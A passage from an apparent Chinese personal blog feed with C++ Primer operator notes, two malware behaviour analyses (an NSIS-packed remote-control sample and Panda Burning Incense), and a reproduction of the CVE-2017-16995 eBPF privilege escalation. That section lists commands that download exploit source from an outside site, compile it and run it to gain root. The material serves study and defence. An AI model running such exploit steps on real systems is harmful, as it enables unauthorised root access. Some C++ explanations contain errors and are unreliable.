—–&gt;bool。例如以下代码，首先bool类型被提升到int类型，然后判断是否非0，非0，然后转化为bool类型。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bool</span> a=<span class="number">1</span>;</div><div class="line"><span class="keyword">int</span> b =-a;</div><div class="line"><span class="keyword">bool</span> a=b;</div><div class="line"><span class="comment">//结果a=1</span></div></pre></td></tr></table></figure></p><h2 id="4-3-逻辑和关系运算符"><a href="#4-3-逻辑和关系运算符" class="headerlink" title="4.3 逻辑和关系运算符"></a>4.3 逻辑和关系运算符</h2><h3 id="逻辑与，逻辑或运算符"><a href="#逻辑与，逻辑或运算符" class="headerlink" title="逻辑与，逻辑或运算符"></a>逻辑与，逻辑或运算符</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;遵循短路求值的策略，一般要先求表达式左侧的，如果成立再求右侧的</p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关系运算符比较对象并返回bool值，如见下面例子：<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int <span class="built_in">i</span>,<span class="built_in">j</span>,k;</div><div class="line"><span class="keyword">if</span>(<span class="built_in">i</span>&lt;<span class="built_in">j</span>&lt;k)</div><div class="line">&#123;//先用i和j比较返回的bool值然后和k比较&#125;</div></pre></td></tr></table></figure></p><h2 id="4-4-赋值运算符"><a href="#4-4-赋值运算符" class="headerlink" title="4.4 赋值运算符"></a>4.4 赋值运算符</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;赋值运算符左侧必须是一个可以修改的对象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;初始化列表转换（窄化转化），是C11新引入的，目的是使转化更加严格。初始化列表需要遵循以下两个原则：</p><ul><li>1）转化的元素只有一个</li><li>2）<strong>使高精度转化为低精度（精度缺失）</strong><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int k<span class="comment">;</span></div><div class="line"><span class="attribute">k</span>=<span class="number">3.22222</span><span class="comment">;    //正确，转化为3，强制类型转化</span></div><div class="line"><span class="attribute">k</span>=&#123;<span class="number">3.243434</span>e&#125;<span class="comment">;  //错误</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;赋值运算符优先级低，举如下例子：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span><span class="params">(p=getchar()</span></span>!=<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line"><span class="comment">//永远为真，因为有限执行的是getar()!=0,然后是赋值语句，永真</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//应该修改为</span></div><div class="line"><span class="function"><span class="title">if</span><span class="params">((p=getchar()</span></span>)!=<span class="number">0</span>)</div><div class="line">&#123;&#125;</div></pre></td></tr></table></figure></p><ul><li>练习4.14：if(42=i)和if(i=42)执行后发生什么？<ul><li>答：if(42=i)是变量赋值给常量，永假;if(i=42)永真</li></ul></li><li>练习4.15：double dval；int ival；int *pi；dval=ival=pi=0;为什么错误？<ul><li>答：double 可以转化为int ，但是int*不能隐式转化为int或者double，应该修改为<figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">ival</span>=dval=*pi<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li></ul><h2 id="4-5-递增和递减"><a href="#4-5-递增和递减" class="headerlink" title="4.5 递增和递减"></a>4.5 递增和递减</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前置版本和后置版本在不使用迭代器数值的时候在表现上没有太大区别，在内存中的区别主要体现在：前置版本只需要把值+1后直接返回，而后置版本在+1后还需要返回到原始数值（即需要将原始数值保存下来以便返回这个未修改的数值)。<strong>故：建议使用递增递减的前置版本（节省空间）</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后置递增运算符的优先级大于解引用的优先级，<strong>所以：<em>pbeg++等价于</em>(pbeg++)</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;谨防产生未定义的行为，对于一条表达式改变了某个运算对象的值，另一个恰好又用到了这个对象的值，如下：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*beg=toupper<span class="comment">(*beg++)</span>；<span class="comment">//赋值运算两边都用到了同一个变量，且右侧的对象被改变了</span></div><div class="line"><span class="comment">//等价于多种可能：</span></div><div class="line"><span class="comment">(*beg)</span>=tooupper<span class="comment">(*beg)</span>;</div><div class="line"><span class="comment">(*beg++)</span>=tooupper<span class="comment">(*beg)</span>;</div></pre></td></tr></table></figure></p><h2 id="4-6-成员访问运算符"><a href="#4-6-成员访问运算符" class="headerlink" title="4.6 成员访问运算符"></a>4.6 成员访问运算符</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;箭头运算符带有解引用的功能<strong>即：Ptr-&gt;mem 等价于 (*Ptr).mem</strong>，因为<strong>解引用运算符的优先级低于点运算符，所以使用点运算符的时候必须要在解引用运算符两侧加上括号</strong></p><h2 id="4-8-位运算符"><a href="#4-8-位运算符" class="headerlink" title="4.8 位运算符"></a>4.8 位运算符</h2><h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><ul><li>左移位运算符：在右侧插入0的二进制位</li><li>右移位运算符：视情况而定：如果是无符号数则在左侧插入值为0的二进制位，如果是有符号数，则在左侧插入符号位的副本（负数）或者值为0的二进制位。</li></ul><h2 id="4-9-sizeof运算符"><a href="#4-9-sizeof运算符" class="headerlink" title="4.9 sizeof运算符"></a>4.9 sizeof运算符</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof 运算符可用于获取类、结构、共用体和其他用户自定义数据类型的大小，sizeof返回的是表达式结果的值，并不是实际计算运算结果的值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">sizeof</span>(p);    <span class="comment">//指针所占用的空间的大小</span></div><div class="line"><span class="keyword">sizeof</span>(*p);    <span class="comment">//指针所指向的对象所占用的空间的大小</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof的结果部分依赖于其作用的类型</p><ul><li>对于解引用指针执行sizeof得到指针指向对象所占用的空间大小，不需要指针有效</li><li>对于数组执行sizeof得到的是整个数组所占据的大小，而并不是指针</li></ul><h2 id="4-10-逗号运算符"><a href="#4-10-逗号运算符" class="headerlink" title="4.10 逗号运算符"></a>4.10 逗号运算符</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逗号运算符的作用是依次执行一系列的运算，取最后一次运算结果作为表达式的结果。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> a=<span class="number">1</span>,v=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span>;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,a+d,v++);  <span class="comment">//结果是5</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="4-11类型转换"><a href="#4-11类型转换" class="headerlink" title="4.11类型转换"></a>4.11类型转换</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;隐式转换：如果两个类型不同的值运算，编译器先是根据转换规则，将运算对象统一后在求值。</p><h3 id="4-11-1-算术转换"><a href="#4-11-1-算术转换" class="headerlink" title="4.11.1 算术转换"></a>4.11.1 算术转换</h3><ul><li>小数据类型转化为大数据类型</li><li>int类型转化为unsigned int</li><li>赋值运算符类型取决于运算符左侧的数据类型<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">3.14+'a';       <span class="string">//</span>字符--&gt;int<span class="params">---</span>&gt;long  double</div><div class="line">flag =dval      <span class="string">//</span>取决于dval是否为0</div><div class="line">ival=dval       <span class="string">//dval</span>切去小数位，保留整数</div><div class="line">ival+usval      <span class="string">//int</span> <span class="params">---</span>&gt;unsigned int</div></pre></td></tr></table></figure></li></ul><h3 id="4-11-2-其他隐式类型转化；"><a href="#4-11-2-其他隐式类型转化；" class="headerlink" title="4.11.2 其他隐式类型转化；"></a>4.11.2 其他隐式类型转化；</h3><ul><li>数组转化为指针</li><li>指针的转化</li><li>转化为布尔类型</li><li>转化为常量<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;j = i;    <span class="comment">//对变量值转化为常量的引用</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> *j = &amp;i;   <span class="comment">//将变量的地址转化为const的地址</span></div></pre></td></tr></table></figure></li></ul><h3 id="4-11-3-显式转换"><a href="#4-11-3-显式转换" class="headerlink" title="4.11.3 显式转换"></a>4.11.3 显式转换</h3>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;4-1-基础&quot;&gt;&lt;a href=&quot;#4-1-基础&quot; class=&quot;headerlink&quot; title=&quot;4.1 基础&quot;&gt;&lt;/a&gt;4.1 基础&lt;/h2&gt;&lt;h3 id=&quot;4-1-2运算符优先级&quot;&gt;&lt;a href=&quot;#4-1-2运算符优先级&quot; class=&quot;headerlink&quot; title=&quot;4.1.2运算符优先级&quot;&gt;&lt;/a&gt;4.1.2运算符优先级&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;算数运算符&amp;gt;关系运算符&amp;gt;逻辑运算符。&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(i!=j&amp;lt;k)&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//先比较j和k的大小，计算出来的bool值和i比较是否相等，不相等返回真。&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(7) ---初步分析[明日再战]</title>
    <link href="http://yoursite.com/2018/03/29/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(7)%20/"/>
    <id>http://yoursite.com/2018/03/29/病毒分析技术(7) /</id>
    <published>2018-03-29T06:02:11.000Z</published>
    <updated>2018-03-31T05:59:27.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析</li><li>4.详细分析<a id="more"></a><h1 id="二：样本信息："><a href="#二：样本信息：" class="headerlink" title="二：样本信息："></a>二：样本信息：</h1></li><li>1.病毒名称：2E6682932F826269B0F84A93AAB9E609.85A681D7</li><li>2.MD5：见下图</li><li>3.是否加壳：是，一种安装型程序的加壳方法</li><li>4.编写语言：未知</li><li>5.来源：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=387959&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D62&amp;page=1" target="_blank" rel="external">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=387959&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D62&amp;page=1</a><h1 id="三：行为分析："><a href="#三：行为分析：" class="headerlink" title="三：行为分析："></a>三：行为分析：</h1></li><li>1）隐藏自身</li><li>2）创建临时文件，判断系统是否被感染</li><li>3) 复制文件到两个目录google/Update，实现隐藏</li><li>3）利用run或者AppCertDll注册表来实现自启</li><li>4）执行子程序，是个远控程序（未验证）<h1 id="四：详细分析："><a href="#四：详细分析：" class="headerlink" title="四：详细分析："></a>四：详细分析：</h1><h2 id="一：样本分析"><a href="#一：样本分析" class="headerlink" title="一：样本分析"></a>一：样本分析</h2></li><li>1）查壳：发现这是一个Nullsoft Install System的东西。<br>  <img src="https://i.imgur.com/tMn0qQN.png" alt=""></li><li>2）直接拖入IDA中，病毒首先做了一些初始化的工作，为以后的运行做准备。<br>  <img src="https://i.imgur.com/sibx97U.png" alt=""></li><li>3）在各磁盘创建临时文件，然后删除文件，重新读取样本文件并重新创建一个新的tmp文件，做这一步的目的主要是隐藏自身<br>  <img src="https://i.imgur.com/s4SkUhk.png" alt=""><br>  <img src="https://i.imgur.com/Qpb4ukN.png" alt=""><br>  <img src="https://i.imgur.com/HASEWpD.png" alt=""></li><li>5）获取了关于本地的一些基本设置之后，程序调用StartAddress，执行病毒的主体部分，这一步开始以为很简单，所以没有过多的静态分析，等到动态验证的时候，跟进去发现sub401389这个函数执行了很长时间（运行时间异常），打开火绒剑发现其进行了很多操作。<br>  <img src="https://i.imgur.com/GaXylPo.png" alt=""><br>  <img src="https://i.imgur.com/AsBMgR9.png" alt=""></li><li>6）通过分析，出现一个很复杂的函数…….其中很多操作都用这个函数的身影，我们采用病毒分析最常见的方法，通过行为来分析代码，这样才能最快速的分析病毒。<br>  <img src="https://i.imgur.com/XiaBJEU.png" alt=""><br>  <img src="https://i.imgur.com/XTzerMd.png" alt=""></li><li>7）在C:\Documents and Settings\hacky\Local Settings\Application Data\NVIDIA Corporation\Update\目录下创建病毒文件</li><li>8）在AppCertDlls下写入本体文件路径，实现自启动。但是没有实现成功</li><li>9）向<strong>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\</strong> 下面写入数据，关闭兼容性助手，可以是作者是想避免病毒因为兼容性问题导致被发现吧。</li><li>10）执行第七步创建的文件，创建进程，远程恢复进程的执行。<br>  <img src="https://i.imgur.com/YmXta3e.png" alt=""><br>  <img src="https://i.imgur.com/z2Piv6M.png" alt=""></li><li>11） 调用RegSetValueEx函数来设置开机启动项，因为其最后创建新的本体，把现在的启动项删除了，我们可以知道这两个也是病毒的启动项，因为他们的构造方法是一样的<br>   <img src="https://i.imgur.com/BUTucqx.png" alt=""><br>   <img src="https://i.imgur.com/oanmmrf.png" alt=""></li><li>12）创建了文件，并实现了其自启动，<br>  <img src="https://i.imgur.com/xfW2mBx.png" alt=""><br>  <img src="https://i.imgur.com/QdAGewk.png" alt=""><br>  <img src="https://i.imgur.com/SkXjqTu.png" alt=""></li><li>13）修改desktop.ini文件实现自身的隐藏<br>  <img src="https://i.imgur.com/OvlEVqE.png" alt=""></li><li>14）启动寄宿文件<br>  <img src="https://i.imgur.com/WN3TcoO.png" alt=""></li><li>15）最后删除之前创建的nsk6.tmp，我估计是用于识别病毒是否成功感染吧。<br>  <img src="https://i.imgur.com/o5Q9zJ4.png" alt=""><br>  <img src="https://i.imgur.com/u25eWFe.png" alt=""><h2 id="二：释放样本分析"><a href="#二：释放样本分析" class="headerlink" title="二：释放样本分析"></a>二：释放样本分析</h2></li><li>1）这个样本只是做了隐藏，但是没有什么破坏行为，通过比较文件指纹信息，发现样本释放的文件和样本不一样。<br>  <img src="https://i.imgur.com/NpUEYiM.png" alt=""></li><li>2）加壳文件什么鬼，关键是软件没查到壳，这个有点难受，IDA可以分析出导入表，但无法交叉引用。gg</li><li>3）网上说这个病毒是个远控程序，搭建inetsim模拟网络，竟然没有查看到信息。<br>  <img src="https://i.imgur.com/Yd6mfTF.png" alt=""><br>  <img src="https://i.imgur.com/a6uQbvf.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;/li&gt;
&lt;li&gt;4.详细分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(6) ---熊猫烧香</title>
    <link href="http://yoursite.com/2018/03/25/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(6)--%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/03/25/病毒分析技术(6)--熊猫烧香病毒/</id>
    <published>2018-03-25T06:02:11.000Z</published>
    <updated>2018-03-25T06:26:45.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析</li><li>4.详细分析<a id="more"></a><h1 id="二：样本分析"><a href="#二：样本分析" class="headerlink" title="二：样本分析"></a>二：样本分析</h1></li><li>1）病毒名称：panda.exe</li><li>2) MD5:3520D3565273E41C9EEB04675D05DCA8</li><li>3) 编译器：delphi</li><li>4）是否加壳：无</li></ul><h1 id="三：行为分析："><a href="#三：行为分析：" class="headerlink" title="三：行为分析："></a>三：行为分析：</h1><ul><li>1）经过两次自校验</li><li>2）判断程序是样本程序，还是被感染程序，还是被隐藏的程序</li><li>3）感染PE文件，WEB文件</li><li>4）设置定时器，结束防御软件进程</li><li>5）利用U盘和网络进行机器间传播</li></ul><h1 id="四：详细分析："><a href="#四：详细分析：" class="headerlink" title="四：详细分析："></a>四：详细分析：</h1><ul><li>1）病毒首先进过两次字验证，来验证自身。<br>   <img src="https://i.imgur.com/qAsM8Ja.png" alt=""></li><li>2）当病毒成功认证完后，跳转到40D173，执行4082F8，获取文件当前目录，查找desktop.ini文件，如果存在，则删除该文件<br>   <img src="https://i.imgur.com/1hWLBcr.png" alt=""></li><li>3）比较进程名是否是C;/WINDOWS/SYSTEM/DIRVER/SPCOLSV，如果是则进行4，否则进行5</li><li>4）查找spcolsv.exe并结束该进程。然后获取/WINDOWS/SYSTEM/DIRVER/SPCOLSV，将病毒本体拷贝到该目录，并且以该目录为参数，启动程序，结束样本进程，实现病毒的隐藏。<br>  <img src="https://i.imgur.com/Os2I7TR.png" alt=""><br>  <img src="https://i.imgur.com/p6E1i8s.png" alt=""></li><li>5）<strong>判断是否为被感染的程序，执行可以自己删除的批处理文件，重复执行4）的操作</strong></li><li>6）执行感染行为<br>  <img src="https://i.imgur.com/7JTZWOv.png" alt=""><br>  <img src="https://i.imgur.com/bfmP9Go.png" alt=""></li><li>7）病毒实现自我保护<br>  <img src="https://i.imgur.com/lBVRRzr.png" alt=""></li><li>8）破坏防病毒软件，结束其进程<br>  <img src="https://i.imgur.com/u69RtFp.png" alt=""></li></ul><h1 id="五：感悟"><a href="#五：感悟" class="headerlink" title="五：感悟"></a>五：感悟</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;病毒没有采用很高深的对抗和隐藏技术，这个病毒分析困难在他把关键的API调用隐藏在函数的嵌套中，不容易看出来，如果直接用导入表为切入口可能会很好解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;/li&gt;
&lt;li&gt;4.详细分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-16995本地提权漏洞复现</title>
    <link href="http://yoursite.com/2018/03/23/CVE-2017-16995%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/03/23/CVE-2017-16995本地提权漏洞复现/</id>
    <published>2018-03-23T09:02:11.000Z</published>
    <updated>2018-03-23T05:58:30.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h1><p>Ubuntu最新版本16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 </p><p>攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。该漏洞编号是CVE-2017-16995，在之前的一些老版本已经修复了，但是在最新的Ubuntu版本中，又出现了这个漏洞，并且Twitter爆出了漏洞利用代码……</p><p>目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。</p><p>影响版本：<br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04<br><a id="more"></a></p><h1 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h1><ul><li><p>1）查看Ubuntu版本，Ubuntu16.04</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -<span class="keyword">a</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/LJRX3Bg.png" alt=""></p></li><li><p>2) 查看本地用户组权限,系统处于用户登录状态</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">id</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/ulpa44S.png" alt=""></p></li><li><p>3）下载PWN代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget  http:<span class="regexp">//</span>cyseclabs.com<span class="regexp">/pub/u</span>pstream44.c</div></pre></td></tr></table></figure></li><li><p>4) 安装gcc编译器</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt <span class="keyword">install</span> gcc</div></pre></td></tr></table></figure></li><li><p>5) 编译.C源文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -o <span class="built_in">test</span> upstream44.c</div></pre></td></tr></table></figure></li><li><p>6) 赋予可执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x <span class="built_in">test</span></div></pre></td></tr></table></figure></li><li><p>7) 查看刚刚操作是否成功生成test文件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">ll</span></div></pre></td></tr></table></figure></li><li><p>8) 执行刚刚编译出来的文件,发现程序执行了本地提权操作（没有经过密码认证从而获取管理员权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./<span class="built_in">test</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/HpdwJrB.png" alt=""></p></li></ul><h1 id="3-原理分析"><a href="#3-原理分析" class="headerlink" title="3.原理分析"></a>3.原理分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞发生的具体原因是：在linux内核中的kernel/bpf/verifier.c中的check_alu_op函数通过4.14.8允许本地用户通过利用不正确的符号扩展来导致拒绝服务（内存损坏）或可能具有未指定的其他影响。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eBPF可用于内核调试和跟踪，网络事件的过滤，其一般机制是：  </p><ul><li>1）用户空间将一个特殊的汇编字节码加载到内核，并且说明附加程序的位置  </li><li>2) 内核运行一个BSP验证器来证明程序是安全的  </li><li>3）内核将字节码转化为本地代码，并将其附加到请求的位置。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eBPF验证器会检查eBPF程序是否符合某些要求：  </li><li>1）它限制了字节码指令的数量  </li><li>2）循环被禁止  </li><li>3）确保没有不可达的说明  </li><li>4）确保没有跳出界限  </li><li>5）确保只有授权区域才能访问内存  </li><li>6）等等。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果验证者通过了一个恶意程序，它会使整个系统面临很大的风险，这是由于eBPF在内核中运行的事实 - 将本该安全执行的内容转变为内核中的任意代码执行。具体来说，在这种情况下，验证者无法验证对内存的访问权限，从而允许读写任意内核地址！  </li></ul><h1 id="4-参考文献"><a href="#4-参考文献" class="headerlink" title="4.参考文献"></a>4.参考文献</h1><p><a href="https://mp.weixin.qq.com/s/h_5LzJafkOJCcLqQAcIuHQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/h_5LzJafkOJCcLqQAcIuHQ</a><br><a href="https://blog.csdn.net/zhao_cancan/article/details/38366541" target="_blank" rel="external">https://blog.csdn.net/zhao_cancan/article/details/38366541</a><br><a href="https://blog.csdn.net/bai___ddd/article/details/79105754" target="_blank" rel="external">https://blog.csdn.net/bai___ddd/article/details/79105754</a><br><a href="https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor?spm=a2c4e.11155515.0.0.p3m7Ql&amp;utmcampaign=General%20website&amp;utmcontent=67375488&amp;utmmedium=social&amp;utmsource=twitter" target="_blank" rel="external">https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor?spm=a2c4e.11155515.0.0.p3m7Ql&amp;utmcampaign=General%20website&amp;utmcontent=67375488&amp;utmmedium=social&amp;utmsource=twitter</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.漏洞概述&quot;&gt;&lt;/a&gt;1.漏洞概述&lt;/h1&gt;&lt;p&gt;Ubuntu最新版本16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 &lt;/p&gt;
&lt;p&gt;攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。该漏洞编号是CVE-2017-16995，在之前的一些老版本已经修复了，但是在最新的Ubuntu版本中，又出现了这个漏洞，并且Twitter爆出了漏洞利用代码……&lt;/p&gt;
&lt;p&gt;目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。&lt;/p&gt;
&lt;p&gt;影响版本：&lt;br&gt;Linux内核：Linux Kernel Version 4.14 ~ 4.4&lt;br&gt;Ubuntu版本：16.04.01~ 16.04.04&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>C++Primer 第三章：字符串，向量，数组</title>
    <link href="http://yoursite.com/2018/03/22/C++%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%AD%97%E7%AC%A6%E4%B8%B2_%E5%90%91%E9%87%8F_%E6%95%B0%E7%BB%84/"/>
    <id>http://yoursite.com/2018/03/22/C++第三章_字符串_向量_数组/</id>
    <published>2018-03-22T07:02:11.000Z</published>
    <updated>2018-03-28T05:48:18.007Z</updated>
    
